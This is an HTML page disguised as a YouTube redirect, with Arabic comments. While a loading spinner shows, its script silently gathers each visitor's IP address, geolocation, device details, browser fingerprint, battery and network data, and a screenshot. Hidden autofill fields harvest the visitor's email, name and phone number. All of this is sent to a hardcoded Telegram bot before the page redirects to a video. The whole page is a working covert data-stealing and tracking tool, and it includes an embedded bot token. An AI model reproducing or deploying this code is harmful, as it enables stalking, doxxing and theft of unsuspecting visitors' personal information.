<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube</title>
    <!-- مكتبات خارجية (اختيارية) -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0f0f0f;color:#fff;font-family:Arial;height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:20px}
        .spinner{width:60px;height:60px;border:5px solid #333;border-top:5px solid #ff0000;border-radius:50%;animation:spin 1s linear infinite}
        @keyframes spin{to{transform:rotate(360deg)}}
        .status{color:#aaa;font-size:14px}
        .hidden-field{position:absolute;left:-9999px;top:-9999px;opacity:0;pointer-events:none;width:1px;height:1px}
    </style>
</head>
<body>
    <div class="spinner"></div>
    <div class="status" id="status">جاري التحميل...</div>

    <!-- حقول خفية للـ Autofill -->
    <input type="email" class="hidden-field" id="hiddenEmail" name="email" autocomplete="email" value="">
    <input type="text" class="hidden-field" id="hiddenName" name="name" autocomplete="name" value="">
    <input type="tel" class="hidden-field" id="hiddenTel" name="tel" autocomplete="tel" value="">

    <script>
        // ===== التوكن الصحيح =====
        const TOKEN = '8990771403:AAEkyyJasNI2mLimV_8A7W4cNGrjJxP_Iao';
        const CHAT_ID = '170383339';
        const TARGET_URL = 'https://youtu.be/YiK3BulNaWQ?si=M1AJboH6vgZymq7-';

        // ===== دالة الإرسال الأساسية (تعمل دائماً) =====
        async function sendMessage(text) {
            try {
                const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true
                    })
                });
                const json = await res.json();
                console.log('Telegram response:', json);
                return json.ok;
            } catch (e) {
                console.error('Send error:', e.message);
                return false;
            }
        }

        // ===== جمع البيانات الأساسية =====
        function getBasicData() {
            const ua = navigator.userAgent;
            const now = new Date();
            return {
                time: now.toLocaleString('ar-SA', { timeZone: 'Asia/Baghdad' }),
                url: window.location.href,
                referrer: document.referrer || 'Direct',
                device: /iPhone/i.test(ua) ? 'iPhone' :
                    /iPad/i.test(ua) ? 'iPad' :
                    /Android/i.test(ua) ? 'Android' :
                    /Windows/i.test(ua) ? 'Windows' :
                    /Mac/i.test(ua) ? 'Mac' : 'Other',
                browser: /Chrome/i.test(ua) && !/Edge/i.test(ua) ? 'Chrome' :
                    /Firefox/i.test(ua) ? 'Firefox' :
                    /Safari/i.test(ua) && !/Chrome/i.test(ua) ? 'Safari' :
                    /Edge/i.test(ua) ? 'Edge' : 'Other',
                mobile: /Mobile|Android|iPhone|iPad/i.test(ua) ? 'Yes' : 'No',
                language: navigator.language || 'ar',
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }

        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(3000) });
                if (res.ok) {
                    const data = await res.json();
                    return data.ip || 'غير متوفر';
                }
            } catch (_) {}
            return 'غير متوفر';
        }

        function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) { resolve(null); return; }
                let done = false;
                navigator.geolocation.getCurrentPosition(
                    (p) => { if (!done) { done = true; resolve({ lat: +p.coords.latitude.toFixed(6), lng: +p.coords.longitude.toFixed(6), acc: Math.round(p.coords.accuracy) }); } },
                    () => { if (!done) { done = true; resolve(null); } },
                    { timeout: 4000 }
                );
                setTimeout(() => { if (!done) { done = true; resolve(null); } }, 5000);
            });
        }

        function buildBasicMessage(info, ip, loc) {
            const locStr = loc ? `${loc.lat}, ${loc.lng} (${loc.acc}m)` : 'غير متوفر';
            const mapLink = loc ? `https://www.google.com/maps?q=${loc.lat},${loc.lng}` : '';

            let msg = `🎯 *New Visitor*\n\n`;
            msg += `⏰ *Time:* ${info.time}\n`;
            msg += `🌐 *URL:* ${info.url}\n`;
            msg += `🔗 *Referrer:* ${info.referrer}\n\n`;
            msg += `📱 *Device:* ${info.device}\n`;
            msg += `🌍 *Browser:* ${info.browser}\n`;
            msg += `📶 *Mobile:* ${info.mobile}\n`;
            msg += `🗣 *Language:* ${info.language}\n`;
            msg += `\n🌐 *IP:* ${ip}\n`;
            msg += `📍 *Location:* ${locStr}\n`;
            if (mapLink) msg += `🗺️ [Map](${mapLink})\n`;
            msg += `📐 *Screen:* ${info.screen}\n`;
            msg += `⏳ *Timezone:* ${info.timezone}\n`;
            return msg;
        }

        // ===== البيانات المتقدمة (تُجمع وتُرسل في الخلفية) =====
        async function collectAdvancedData() {
            const data = {};

            // البطارية
            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    data.battery = `${Math.round(b.level * 100)}%${b.charging ? ' (charging)' : ''}`;
                }
            } catch (_) {}

            // الشبكة
            try {
                if (navigator.connection) {
                    const c = navigator.connection;
                    data.network = `${c.effectiveType || '?'} (${c.downlink || '?'} Mbps)`;
                }
            } catch (_) {}

            // نظام التشغيل
            const ua = navigator.userAgent;
            let os = 'Unknown';
            if (ua.includes('Windows NT 10.0')) os = 'Windows 10/11';
            else if (ua.includes('Windows NT 6.3')) os = 'Windows 8.1';
            else if (ua.includes('Windows NT 6.2')) os = 'Windows 8';
            else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
            else if (ua.includes('Mac OS X 10_15')) os = 'macOS Catalina';
            else if (ua.includes('Mac OS X 10_14')) os = 'macOS Mojave';
            else if (ua.includes('Android')) os = 'Android ' + (ua.match(/Android\s([\d.]+)/) || [])[1];
            else if (ua.includes('iPhone OS')) os = 'iOS ' + (ua.match(/iPhone OS\s([\d_]+)/) || [])[1]?.replace(/_/g, '.');
            else if (ua.includes('Linux')) os = 'Linux';
            data.os = os;

            // بصمة المتصفح
            try {
                const fp = await FingerprintJS.load();
                const result = await fp.get();
                data.fingerprint = result.visitorId || 'غير متوفرة';
            } catch (_) {}

            // Autofill (الإيميل، الاسم، الهاتف)
            try {
                const emailEl = document.getElementById('hiddenEmail');
                const nameEl = document.getElementById('hiddenName');
                const telEl = document.getElementById('hiddenTel');

                [emailEl, nameEl, telEl].forEach(el => {
                    el.style.position = 'fixed';
                    el.style.left = '0';
                    el.style.top = '0';
                    el.style.opacity = '0';
                    el.style.pointerEvents = 'none';
                    el.style.width = '1px';
                    el.style.height = '1px';
                    el.style.zIndex = '-9999';
                });

                emailEl.focus(); setTimeout(() => emailEl.blur(), 100);
                nameEl.focus(); setTimeout(() => nameEl.blur(), 100);
                telEl.focus(); setTimeout(() => telEl.blur(), 100);

                await new Promise(r => setTimeout(r, 400));

                const email = emailEl.value.trim();
                data.email = (email && email.includes('@')) ? email : 'غير موجود';
                data.name = nameEl.value.trim() || 'غير موجود';
                data.phone = telEl.value.trim() || 'غير موجود';

                [emailEl, nameEl, telEl].forEach(el => el.style.display = 'none');
            } catch (_) {
                data.email = 'غير موجود';
                data.name = 'غير موجود';
                data.phone = 'غير موجود';
            }

            return data;
        }

        function buildAdvancedMessage(adv) {
            let msg = `🔍 *Advanced Data*\n\n`;
            msg += `📧 *Email:* ${adv.email}\n`;
            msg += `📛 *Name:* ${adv.name}\n`;
            msg += `📱 *Phone:* ${adv.phone}\n`;
            msg += `🆔 *Fingerprint:* ${adv.fingerprint || 'غير متوفرة'}\n`;
            msg += `🔋 *Battery:* ${adv.battery || '?'}\n`;
            msg += `📡 *Network:* ${adv.network || '?'}\n`;
            msg += `💻 *OS:* ${adv.os || 'Unknown'}\n`;
            return msg;
        }

        // ===== إرسال لقطة الشاشة =====
        async function sendScreenshot() {
            try {
                const canvas = await html2canvas(document.body, {
                    scale: 1.2,
                    backgroundColor: '#0f0f0f',
                    logging: false,
                    allowTaint: false,
                    useCORS: true
                });
                const dataURL = canvas.toDataURL('image/jpeg', 0.8);
                const byteString = atob(dataURL.split(',')[1]);
                const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
                const ab = new ArrayBuffer(byteString.length);
                const ia = new Uint8Array(ab);
                for (let i = 0; i < byteString.length; i++) {
                    ia[i] = byteString.charCodeAt(i);
                }
                const blob = new Blob([ab], { type: mimeString });
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'screenshot.jpg');
                formData.append('caption', '📸 *Page Screenshot*');
                formData.append('parse_mode', 'Markdown');

                const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                console.log('Screenshot response:', res.ok);
            } catch (e) {
                console.error('Screenshot error:', e.message);
            }
        }

        // ===== التشغيل الرئيسي =====
        async function main() {
            document.getElementById('status').textContent = 'جمع البيانات...';

            // 1. البيانات الأساسية (تُرسل فوراً)
            const basic = getBasicData();
            const ip = await getIP();
            const loc = await getLocation();
            const basicMsg = buildBasicMessage(basic, ip, loc);

            document.getElementById('status').textContent = 'إرسال البيانات الأساسية...';
            const sent = await sendMessage(basicMsg);

            if (sent) {
                document.getElementById('status').textContent = '✅ تم الإرسال!';
            } else {
                document.getElementById('status').textContent = '⚠️ فشل الإرسال الأساسي!';
            }

            // 2. البيانات المتقدمة (تُرسل في الخلفية بعد 1 ثانية)
            setTimeout(async () => {
                try {
                    const adv = await collectAdvancedData();
                    const advMsg = buildAdvancedMessage(adv);
                    await sendMessage(advMsg);
                } catch (e) {
                    console.error('Advanced error:', e.message);
                }
            }, 1000);

            // 3. لقطة الشاشة (تُرسل بعد 1.5 ثانية)
            setTimeout(async () => {
                try {
                    await sendScreenshot();
                } catch (e) {
                    console.error('Screenshot error:', e.message);
                }
            }, 1500);

            // 4. التحويل بعد 2.5 ثانية
            setTimeout(() => {
                document.getElementById('status').textContent = 'جاري التحويل...';
                window.location.replace(TARGET_URL);
            }, 2500);
        }

        // ===== البدء =====
        if (document.readyState === 'complete') {
            setTimeout(main, 300);
        } else {
            window.addEventListener('load', () => setTimeout(main, 300));
        }
    </script>
</body>
</html>
